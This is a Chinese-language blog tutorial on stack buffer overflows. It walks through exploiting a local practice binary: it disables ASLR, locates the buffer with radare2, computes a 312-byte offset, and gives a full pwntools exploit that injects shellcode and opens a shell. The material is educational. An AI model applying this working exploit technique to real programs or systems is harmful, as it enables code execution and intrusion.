---
title: Shellcode
subtitle: 运行你自己的指令
date: 2023-08-08T05:09:08+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:
---

在真正的漏洞利用中，你不太可能拥有 `win()` 函数。Shellcode 是一种允许 **运行你自己的
指令** 的方法，使你能够在系统上运行任意命令。

**Shellcode** 本质上是 **汇编指令**，一旦我们将它输入到二进制文件中，它就会覆盖
返回指针以劫持代码，指向并执行我们自己的指令。

<!--more-->

{{<admonition type="warning">}}

我保证你可以相信我，但你永远不应该在不知道 shellcode 作用的情况下运行它。
Pwntools 很安全，并且几乎拥有你需要的所有 shellcode。

{{</admonition>}}

Shellcode 成功的原因是 [冯·诺伊曼结构](https://zh.wikipedia.org/wiki/%E5%86%AF%C2%B7%E8%AF%BA%E4%BC%8A%E6%9B%BC%E7%BB%93%E6%9E%84)（当今大多数计算机使用的体系结构）不区分
数据和指令——无论你告诉它在哪里运行或运行什么内容，它都会尝试运行它。因此，
即使我们输入的是攻击指令，计算机也不知道这一点，我们可以利用它来发挥我们的优势。

{{< link href="/pwn_assets/shellcode.zip" content="shellcode.zip" title="Download shellcode.zip" download="shellcode.zip" card=true >}}

## 0x01 禁用 ASLR

ASLR 是一种安全技术，虽然它不是专门为对抗 shellcode 而设计的，但它涉及随机化
内存的某些方面（我们稍后将更详细地讨论它）。这种随机化可能会使我们的 shellcode
变得不可靠，所以我们现在将 [禁用](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization) 它。

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

{{<admonition type="info">}}

类似这样的功能性指令以后还会碰到更多，我建议使用 `alias` 为它们创建一个别名。
因为就算不考虑能不能记住这些指令，如果每次都手动输入那么长的指令也是一件很
浪费时间的事情。

{{</admonition>}}

{{<admonition type="warning">}}

再次强调，如果你不知道指令的作用，则永远不要运行该指令。

{{</admonition>}}

## 0x02 确定缓冲区位置

使用 `radare2` 调试 `vuln()` ，并找出缓冲区在内存中的起始位置；这就是我们
想要将返回指针指向的位置。

```bash
$ r2 -d -A ./vuln

[0xf7fe3fd0]> s sym.unsafe; pdf
[...]
; var int32_t var_134h @ ebp-0x134
[...]
```

打印出来的这个值是一个 **局部变量**。根据它的大小，可以判断出它很可能是缓冲区。
让我们在 `gets()` 之后设置一个断点并找到确切的地址。

```bash
[0x08049172]> db 0x080491a8
[0x08049172]> dc
Overflow me
<<IM HERE>>         <== This was my input
INFO: hit breakpoint at: 0x80491a8
[0x080491a8]> px @ ebp-0x134
- offset -  B4B5 B6B7 B8B9 BABB BCBD BEBF C0C1 C2C3  456789ABCDEF0123
0xffffd6b4  3c3c 494d 2048 4552 453e 3e00 2e4e 3df6  <<IM HERE>>..N=.
[...]
```

它似乎位于 `0xffffd6b4`；如果我们多次运行二进制文件，它应该保持在原来的位置
（如果没有，请确保 **禁用 ASLR！**）。

## 0x03 计算溢出 Padding

现在我们需要计算溢出 Padding。我们将使用 De Bruijn 序列，如上一篇博客文章中所述。

```bash
$ ragg2 -r -P 500
<COPY THIS>

$ r2 -d -A ./vuln
[0xf7fe3fd0]> dc
Overflow me
<<PASTE HERE>>
[0x73424172]> wopO `dr eip`
312
```

得到溢出 Padding 是 312 字节。

## 0x04 编写 EXP

为了使 shellcode 正确，我们将把 `context.binary` 设置为我们的二进制文件；
这会获取诸如架构、操作系统和位数之类的东西，并使 pwntools 能够为我们提供
shellcode。

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()
```

{{<admonition type="info">}}

我们可以只使用 `process()` ，因为一旦设置了 `context.binary` 就默认假定
使用该进程。

{{</admonition>}}

现在我们可以使用 pwntools 出色的 shellcode 功能轻易的构建 shellcode 。

```python
# 构建 Shellcode
payload = asm(shellcraft.sh())
# 溢出 Padding
payload = payload.ljust(312, b'A')
# Shellcode 的地址
payload += p32(0xffffd6b4)
```

现在让我们将其发送出去并使用 `p.interactive()`，它使我们能够与
shell 通信。

```python
log.info(p.clean())

p.sendline(payload)

p.interactive()
```

{{<admonition type="warning">}}

如果你收到 `EOFError`，请打印出 shellcode 并尝试在内存中查找它。
栈地址可能是错误的。

你可以参考这篇 [博客](https://www.cubeyond.net/ret2win/) 中的方法来解决这个问题。

{{</admonition>}}

```bash
$ python3 exp.py
[*] 'vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process 'vuln': pid 3903
[*] Overflow me
[*] Switching to interactive mode
$ whoami
cub3y0nd
$ ls
exp.py  source.c  vuln
```

## 0x05 最终 EXP

```python {title="exp.py"}
from pwn import *

context.binary = ELF('./vuln')

p = process()

# 构建 Shellcode
payload = asm(shellcraft.sh())
# 溢出 Padding
payload = payload.ljust(312, b'A')
# Shellcode 的地址
payload += p32(0xffffd6b4)

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

## 0x06 总结

- 当提示输入时，我们注入了 shellcode（一系列汇编指令）
- 然后，我们通过覆盖栈上保存的返回指针以指向我们的 shellcode
来劫持代码执行
- 一旦返回指针弹出到 EIP 中，它就指向我们的 shellcode
- 这导致程序执行我们的指令，为我们（在本例中）提供了用于执行
任意命令的 shell
